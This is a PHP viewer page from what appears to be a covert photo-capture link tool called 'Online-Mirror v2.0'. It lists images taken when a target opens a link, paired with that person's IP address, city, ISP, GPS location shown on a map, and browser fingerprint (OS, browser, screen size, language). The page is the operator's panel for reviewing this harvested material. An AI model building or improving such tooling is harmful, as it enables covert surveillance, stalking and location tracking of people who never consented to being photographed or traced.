<?php
/**
 * Online-Mirror 升级版 v2.0 - 照片查看页
 * 支持：灯箱大图预览、GPS地图、浏览器指纹、IP归属地
 */
session_start();
require_once __DIR__ . '/config.php';

$id = trim($_GET['id'] ?? '');
$type = trim($_GET['type'] ?? '');
$page = max(0, intval($_GET['page'] ?? 0));
$per_page = 6;

if (empty($id)) {
    die('<h2 style="text-align:center;margin-top:50px;color:#888;">缺少ID参数</h2>');
}

$db = getDB();

// 删除单张照片
if ($type === 'delete' && isset($_GET['photo_id']) && isLoggedIn()) {
    requireCsrf();
    $photo_id = intval($_GET['photo_id']);
    $stmt = $db->prepare("SELECT file_path FROM photos WHERE id = ? AND link_id = ?");
    $stmt->execute([$photo_id, $id]);
    $photo = $stmt->fetch();
    if ($photo) {
        $filepath = IMG_DIR . $photo['file_path'];
        if (file_exists($filepath)) unlink($filepath);
        $stmt = $db->prepare("DELETE FROM photos WHERE id = ?");
        $stmt->execute([$photo_id]);
        $stmt = $db->prepare("UPDATE links SET captures = GREATEST(captures - 1, 0) WHERE link_id = ?");
        $stmt->execute([$id]);
        addLog($id, 'delete_photo');
    }
    header("Location: photos.php?id=" . urlencode($id));
    exit;
}

// 清空所有照片
if ($type === 'clear' && isLoggedIn()) {
    requireCsrf();
    $stmt = $db->prepare("SELECT file_path FROM photos WHERE link_id = ?");
    $stmt->execute([$id]);
    $photos = $stmt->fetchAll();
    foreach ($photos as $p) {
        $fp = IMG_DIR . $p['file_path'];
        if (file_exists($fp)) unlink($fp);
    }
    $stmt = $db->prepare("DELETE FROM photos WHERE link_id = ?");
    $stmt->execute([$id]);
    $stmt = $db->prepare("UPDATE links SET captures = 0 WHERE link_id = ?");
    $stmt->execute([$id]);
    addLog($id, 'clear_photos');
    header("Location: photos.php?id=" . urlencode($id));
    exit;
}

// 获取照片
$stmt = $db->prepare("SELECT * FROM photos WHERE link_id = ? ORDER BY created_at DESC");
$stmt->execute([$id]);
$all_photos = $stmt->fetchAll();
$total = count($all_photos);
$total_pages = max(1, ceil($total / $per_page));
$page = min($page, $total_pages - 1);
$photos = array_slice($all_photos, $page * $per_page, $per_page);

// 获取链接信息
$stmt = $db->prepare("SELECT * FROM links WHERE link_id = ?");
$stmt->execute([$id]);
$link = $stmt->fetch();

$csrf = csrfToken();
?>
<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<link rel="icon" type="image/x-icon" href="favicon.ico">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>照片查看 · <?php echo htmlspecialchars($id); ?></title>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
<!-- Spotlight.js 灯箱 -->
<link rel="stylesheet" href="https://cdn.jsdmirror.cn/npm/spotlight.js@0.7.8/dist/css/spotlight.min.css">
<script src="https://cdn.jsdmirror.cn/npm/spotlight.js@0.7.8/dist/js/spotlight.min.js"></script>
<script>
document.addEventListener('DOMContentLoaded', function() {
    if (typeof Spotlight !== 'undefined') {
        new Spotlight(document.querySelectorAll('[data-spotlight]'));
    }
});
</script>
<!-- Leaflet.js 地图 -->
<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
<style>
* { margin: 0; padding: 0; box-sizing: border-box; }
body {
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
    background: #0f0c29;
    color: #e0e0e0;
    min-height: 100vh;
}
.header {
    background: rgba(255,255,255,0.05);
    backdrop-filter: blur(20px);
    border-bottom: 1px solid rgba(255,255,255,0.08);
    padding: 20px;
    position: sticky;
    top: 0;
    z-index: 100;
}
.header-inner {
    max-width: 1200px;
    margin: 0 auto;
    display: flex;
    align-items: center;
    justify-content: space-between;
    flex-wrap: wrap;
    gap: 10px;
}
.header h2 { font-size: 20px; }
.header h2 small { font-size: 14px; color: #8080a0; font-weight: normal; }
.header .actions { display: flex; gap: 8px; flex-wrap: wrap; }
.header .actions a {
    padding: 8px 16px; border-radius: 8px; text-decoration: none;
    font-size: 13px; transition: all 0.3s;
}
.btn-back { background: rgba(255,255,255,0.08); color: #a0a0b8; }
.btn-back:hover { background: rgba(255,255,255,0.12); }
.btn-clear { background: rgba(255,80,80,0.15); color: #ff6b6b; }
.btn-clear:hover { background: rgba(255,80,80,0.25); }
.btn-dash { background: rgba(102,126,234,0.15); color: #667eea; }
.btn-dash:hover { background: rgba(102,126,234,0.25); }

.content { max-width: 1200px; margin: 0 auto; padding: 20px; }

/* 统计面板 */
.stats {
    display: grid;
    grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
    gap: 12px; margin-bottom: 24px;
}
.stat-card {
    background: rgba(255,255,255,0.05);
    border: 1px solid rgba(255,255,255,0.08);
    border-radius: 16px;
    padding: 16px; text-align: center;
}
.stat-card .num {
    font-size: 28px; font-weight: 700;
    background: linear-gradient(135deg, #667eea, #764ba2);
    -webkit-background-clip: text; -webkit-text-fill-color: transparent;
}
.stat-card .label { font-size: 12px; color: #8080a0; margin-top: 4px; }

/* 照片卡片 + 灯箱 */
.photo-grid {
    display: grid;
    grid-template-columns: repeat(auto-fill, minmax(320px, 1fr));
    gap: 16px;
}
.photo-card {
    background: rgba(255,255,255,0.04);
    border: 1px solid rgba(255,255,255,0.08);
    border-radius: 16px;
    overflow: hidden;
    transition: all 0.3s;
}
.photo-card:hover { transform: translateY(-3px); box-shadow: 0 8px 25px rgba(0,0,0,0.3); }
.photo-card .img-wrap {
    width: 100%;
    aspect-ratio: 3/4;
    background: #1a1a2e;
    display: flex;
    align-items: center;
    justify-content: center;
    overflow: hidden;
    cursor: zoom-in;
}
.photo-card .img-wrap img {
    width: 100%;
    height: 100%;
    object-fit: contain;
    background: #111;
}
.photo-card .info {
    padding: 12px 14px;
    font-size: 12px;
    color: #8080a0;
}
.photo-card .info .row {
    display: flex;
    justify-content: space-between;
    align-items: center;
    margin-bottom: 4px;
}
.photo-card .info .row:last-child { margin-bottom: 0; }
.photo-card .info .del-btn {
    color: #ff6b6b; text-decoration: none;
    padding: 4px 8px; border-radius: 6px;
    background: rgba(255,80,80,0.1);
    font-size: 11px; transition: all 0.3s;
}
.photo-card .info .del-btn:hover { background: rgba(255,80,80,0.2); }
.photo-card .info .download-btn {
    color: #4caf50; text-decoration: none;
    padding: 4px 8px; margin-right: 6px;
    border-radius: 6px; background: rgba(76,175,80,0.1);
    font-size: 11px; transition: all 0.3s;
}
.photo-card .info .download-btn:hover { background: rgba(76,175,80,0.2); }
.photo-card .fingerprint {
    padding: 0 14px 10px;
    font-size: 11px;
    color: #606080;
    display: flex;
    flex-wrap: wrap;
    gap: 6px;
}
.photo-card .fingerprint .tag {
    background: rgba(102,126,234,0.1);
    padding: 2px 8px;
    border-radius: 4px;
    color: #8080c0;
}

/* 标签 */
.tags-display {
    display: flex;
    flex-wrap: wrap;
    gap: 6px;
    margin-top: 4px;
}
.tags-display .tag {
    background: rgba(102,126,234,0.15);
    padding: 2px 10px;
    border-radius: 6px;
    font-size: 11px;
    color: #667eea;
}

/* 地图按钮 */
.map-btn {
    display: inline-block;
    padding: 4px 12px;
    border-radius: 6px;
    background: rgba(76,175,80,0.12);
    color: #4caf50;
    font-size: 11px;
    cursor: pointer;
    text-decoration: none;
    transition: all 0.3s;
    border: none;
}
.map-btn:hover { background: rgba(76,175,80,0.25); }

/* 地图弹窗遮罩 */
.map-modal {
    display: none;
    position: fixed;
    top: 0; left: 0; right: 0; bottom: 0;
    z-index: 9999;
    background: rgba(0,0,0,0.85);
    justify-content: center;
    align-items: center;
}
.map-modal.show { display: flex; }
.map-modal .modal-box {
    background: #1a1a2e;
    border: 1px solid rgba(255,255,255,0.12);
    border-radius: 16px;
    overflow: hidden;
    width: 90vw;
    max-width: 600px;
}
.map-modal .modal-header {
    padding: 14px 20px;
    display: flex;
    justify-content: space-between;
    align-items: center;
    border-bottom: 1px solid rgba(255,255,255,0.06);
}
.map-modal .modal-header h3 { font-size: 16px; }
.map-modal .modal-header .close-btn {
    font-size: 24px; color: #8080a0;
    cursor: pointer; border: none;
    background: none;
}
.map-modal .modal-header .close-btn:hover { color: #fff; }
.map-modal .modal-body {
    height: 60vh;
    max-height: 500px;
}

/* 翻页 */
.pagination {
    display: flex; justify-content: center; gap: 8px;
    margin-top: 24px; padding-bottom: 40px;
}
.pagination a {
    padding: 8px 16px; border-radius: 8px;
    background: rgba(255,255,255,0.06);
    color: #a0a0b8; text-decoration: none; font-size: 14px; transition: all 0.3s;
}
.pagination a:hover { background: rgba(255,255,255,0.12); }
.pagination a.active {
    background: linear-gradient(135deg, #667eea, #764ba2);
    color: white;
}
.empty-state {
    text-align: center; padding: 80px 20px; color: #606080;
}
.empty-state i { font-size: 64px; margin-bottom: 16px; }
.empty-state p { font-size: 16px; }

@media (max-width: 640px) {
    .photo-grid { grid-template-columns: 1fr; }
    .header-inner { flex-direction: column; align-items: flex-start; }
}
</style>
</head>
<body>
<div class="header">
    <div class="header-inner">
        <h2><i class="fas fa-images"></i> 照片查看 <small>ID: <?php echo htmlspecialchars($id); ?></small></h2>
        <div class="actions">
            <?php if ($link && $link['tags']): ?>
            <div class="tags-display">
                <?php foreach (explode(',', $link['tags']) as $t): ?>
                <span class="tag"><?php echo htmlspecialchars(trim($t)); ?></span>
                <?php endforeach; ?>
            </div>
            <?php endif; ?>
            <a href="dashboard.php" class="btn-dash"><i class="fas fa-tachometer-alt"></i> 控制台</a>
            <?php if ($total > 0 && isLoggedIn()): ?>
                <a href="?id=<?php echo urlencode($id); ?>&type=clear&csrf_token=<?php echo $csrf; ?>" class="btn-clear" onclick="return confirm('确定清空所有照片？')"><i class="fas fa-trash"></i> 清空</a>
            <?php endif; ?>
        </div>
    </div>
</div>

<div class="content">
    <?php if ($link): ?>
    <div class="stats">
        <div class="stat-card">
            <div class="num"><?php echo $total; ?></div>
            <div class="label">📸 照片总数</div>
        </div>
        <div class="stat-card">
            <div class="num"><?php echo $link['views']; ?></div>
            <div class="label">👁️ 访问次数</div>
        </div>
        <div class="stat-card">
            <div class="num"><?php echo date('m/d', strtotime($link['created_at'])); ?></div>
            <div class="label">📅 创建日期</div>
        </div>
        <?php if ($link['expires_at']): ?>
        <div class="stat-card">
            <div class="num" style="font-size:20px;"><?php echo date('m/d', strtotime($link['expires_at'])); ?></div>
            <div class="label">⏳ 过期时间</div>
        </div>
        <?php endif; ?>
    </div>
    <?php endif; ?>

    <?php if (empty($photos)): ?>
    <div class="empty-state">
        <i class="fas fa-camera-slash"></i>
        <p>暂无照片，等待对方打开链接...</p>
    </div>
    <?php else: ?>
    <div class="photo-grid">
        <?php foreach ($photos as $photo): ?>
        <div class="photo-card">
            <div class="img-wrap">
                <a href="img/<?php echo htmlspecialchars($photo['file_path']); ?>" data-spotlight="photos">
                    <img src="img/<?php echo htmlspecialchars($photo['file_path']); ?>" alt="照片" loading="lazy">
                </a>
            </div>
            <div class="info">
                <div class="row">
                    <span><i class="far fa-clock"></i> <?php echo date('m-d H:i', strtotime($photo['created_at'])); ?></span>
                    <span>
                        <a href="img/<?php echo htmlspecialchars($photo['file_path']); ?>" download class="download-btn"><i class="fas fa-download"></i></a>
                        <?php if (isLoggedIn()): ?>
                        <a href="?id=<?php echo urlencode($id); ?>&type=delete&photo_id=<?php echo $photo['id']; ?>&csrf_token=<?php echo $csrf; ?>" class="del-btn" onclick="return confirm('删除这张照片？')"><i class="fas fa-times"></i></a>
                        <?php endif; ?>
                    </span>
                </div>
                <div class="row">
                    <span><i class="fas fa-map-pin"></i> <?php echo htmlspecialchars($photo['ip_address'] ?? '-'); ?></span>
                    <?php if ($photo['file_size']): ?>
                    <span><?php echo formatSize($photo['file_size']); ?></span>
                    <?php endif; ?>
                </div>
                <?php if ($photo['city'] || $photo['isp']): ?>
                <div class="row" style="color:#667eea;">
                    <span><i class="fas fa-globe"></i> <?php echo htmlspecialchars($photo['city'] ?? ''); ?></span>
                    <span><?php echo htmlspecialchars($photo['isp'] ?? ''); ?></span>
                </div>
                <?php endif; ?>
            </div>
            
            <?php if ($photo['screen_resolution'] || $photo['os'] || $photo['browser']): ?>
            <div class="fingerprint">
                <?php if ($photo['os']): ?><span class="tag"><i class="fas fa-laptop"></i> <?php echo htmlspecialchars($photo['os']); ?></span><?php endif; ?>
                <?php if ($photo['browser']): ?><span class="tag"><i class="fas fa-globe"></i> <?php echo htmlspecialchars($photo['browser']); ?></span><?php endif; ?>
                <?php if ($photo['screen_resolution']): ?><span class="tag"><i class="fas fa-expand"></i> <?php echo htmlspecialchars($photo['screen_resolution']); ?></span><?php endif; ?>
                <?php if ($photo['browser_lang']): ?><span class="tag"><i class="fas fa-language"></i> <?php echo htmlspecialchars($photo['browser_lang']); ?></span><?php endif; ?>
            </div>
            <?php endif; ?>
            
            <?php if ($photo['lat'] && $photo['lng']): ?>
            <div style="padding:0 14px 10px;">
                <button class="map-btn" onclick="openMap(<?php echo $photo['lat']; ?>, <?php echo $photo['lng']; ?>, '<?php echo htmlspecialchars($photo['city'] ?? '未知位置'); ?>')">
                    <i class="fas fa-map-marked-alt"></i> 查看地图
                </button>
            </div>
            <?php endif; ?>
        </div>
        <?php endforeach; ?>
    </div>

    <!-- 地图弹窗 -->
    <div class="map-modal" id="mapModal">
        <div class="modal-box">
            <div class="modal-header">
                <h3><i class="fas fa-map-marked-alt" style="color:#4caf50;"></i> <span id="mapTitle">地图位置</span></h3>
                <button class="close-btn" onclick="closeMap()">&times;</button>
            </div>
            <div class="modal-body" id="mapContainer"></div>
        </div>
    </div>

    <script>
    var mapInstance = null;
    
    function openMap(lat, lng, title) {
        document.getElementById('mapTitle').textContent = title || '地图位置';
        document.getElementById('mapModal').classList.add('show');
        document.body.style.overflow = 'hidden';
        
        setTimeout(function() {
            if (mapInstance) {
                mapInstance.remove();
                mapInstance = null;
            }
            
            mapInstance = L.map('mapContainer', {
                zoomControl: true,
                scrollWheelZoom: true
            }).setView([lat, lng], 15);
            
            L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
                maxZoom: 18,
                attribution: '&copy; <a href="https://openstreetmap.org/copyright">OSM</a>'
            }).addTo(mapInstance);
            
            L.marker([lat, lng]).addTo(mapInstance)
                .bindPopup(title || ('📍 ' + lat.toFixed(4) + ', ' + lng.toFixed(4)))
                .openPopup();
                
            setTimeout(function() { mapInstance.invalidateSize(); }, 200);
        }, 300);
    }
    
    function closeMap() {
        document.getElementById('mapModal').classList.remove('show');
        document.body.style.overflow = '';
        if (mapInstance) {
            mapInstance.remove();
            mapInstance = null;
        }
    }
    
    document.addEventListener('keydown', function(e) {
        if (e.key === 'Escape') closeMap();
    });
    </script>

    <?php if ($total_pages > 1): ?>
    <div class="pagination">
        <?php for ($i = 0; $i < $total_pages; $i++): ?>
        <a href="?id=<?php echo urlencode($id); ?>&page=<?php echo $i; ?>" class="<?php echo $i === $page ? 'active' : ''; ?>"><?php echo $i + 1; ?></a>
        <?php endfor; ?>
    </div>
    <?php endif; ?>
    <?php endif; ?>
</div>
</body>
</html>
